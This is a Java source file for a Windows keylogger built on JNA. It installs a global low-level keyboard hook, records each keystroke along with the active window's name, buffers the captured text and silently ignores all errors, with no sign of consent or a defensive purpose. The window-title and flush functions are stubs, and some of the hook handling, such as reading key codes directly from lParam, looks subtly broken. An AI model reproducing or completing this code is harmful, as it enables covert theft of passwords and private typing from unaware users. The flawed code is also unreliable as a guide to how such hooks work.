import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinUser;
import java.awt.Font;

public class Keylogger {

    private static long hookHandle;

    private static WinUser.LowLevelKeyboardProc keyboardProc;

    private static boolean isActive;

    private static final StringBuilder keystrokeBuffer = new StringBuilder();

    private static String currentWindowTitle = "";

    public static void install() {
        if (isActive) return;

        try {

            keyboardProc = (nCode, wParam, lParam) -> {
                if (nCode >= 0) {
                    processKeystroke(wParam.intValue(), lParam);
                }

                return WinUser.INSTANCE.CallNextHookEx(
                    new WinDef.HHOOK(new Pointer(hookHandle)),
                    nCode, wParam, lParam
                );
            };

            WinDef.HHOOK hook = WinUser.INSTANCE.SetWindowsHookEx(
                13,
                keyboardProc,
                null,
                0
            );

            if (hook != null) {
                hookHandle = Pointer.nativeValue(hook.getPointer());
                isActive = true;
                startMessageLoop();
            }

        } catch (Exception e) {

        }
    }

    public static void uninstall() {
        if (!isActive) return;
        try {
            WinUser.INSTANCE.UnhookWindowsHookEx(
                new WinDef.HHOOK(new Pointer(hookHandle))
            );
            isActive = false;
        } catch (Exception e) {

        }
    }

    private static void processKeystroke(int wParam, WinDef.LPARAM lParam) {

        if (wParam != 0x100 && wParam != 0x104) return;

        try {

            int vkCode = lParam.intValue() & 0xFF;

            String newTitle = getForegroundWindowTitle();
            if (!newTitle.equals(currentWindowTitle)) {
                if (keystrokeBuffer.length() > 0) {
                    flushBuffer();
                }
                currentWindowTitle = newTitle;
                keystrokeBuffer.append("\n[").append(newTitle).append("]\n");
            }

            String keyStr = virtualKeyToString(vkCode);
            keystrokeBuffer.append(keyStr);

            if (keystrokeBuffer.length() > 500) {
                flushBuffer();
            }

        } catch (Exception e) {

        }
    }

    private static String virtualKeyToString(int vkCode) {
        switch (vkCode) {
            case 0x08: return "[BACKSPACE]";
            case 0x09: return "[TAB]";
            case 0x0D: return "[ENTER]\n";
            case 0x10: return "[SHIFT]";
            case 0x11: return "[CTRL]";
            case 0x12: return "[ALT]";
            case 0x1B: return "[ESC]";
            case 0x20: return " ";
            case 0x2E: return "[DELETE]";
            case 0x5B: return "[WIN]";
            default:
                if (vkCode >= 0x30 && vkCode <= 0x39) {
                    return String.valueOf((char) vkCode);
                }
                if (vkCode >= 0x41 && vkCode <= 0x5A) {
                    return String.valueOf((char) vkCode);
                }
                return "[" + String.format("%02X", vkCode) + "]";
        }
    }

    private static String getForegroundWindowTitle() {
        try {

            return "Unknown Window";
        } catch (Exception e) {
            return "Unknown Window";
        }
    }

    private static void flushBuffer() {
        if (keystrokeBuffer.length() == 0) return;

        String captured = keystrokeBuffer.toString();
        keystrokeBuffer.setLength(0);

    }

    private static void startMessageLoop() {
        Thread messageThread = new Thread(() -> {

            WinUser.MSG msg = new WinUser.MSG();
            while (WinUser.INSTANCE.GetMessage(msg, null, 0, 0) != 0) {
                WinUser.INSTANCE.TranslateMessage(msg);
                WinUser.INSTANCE.DispatchMessage(msg);
            }
        });
        messageThread.setDaemon(true);
        messageThread.start();
    }
}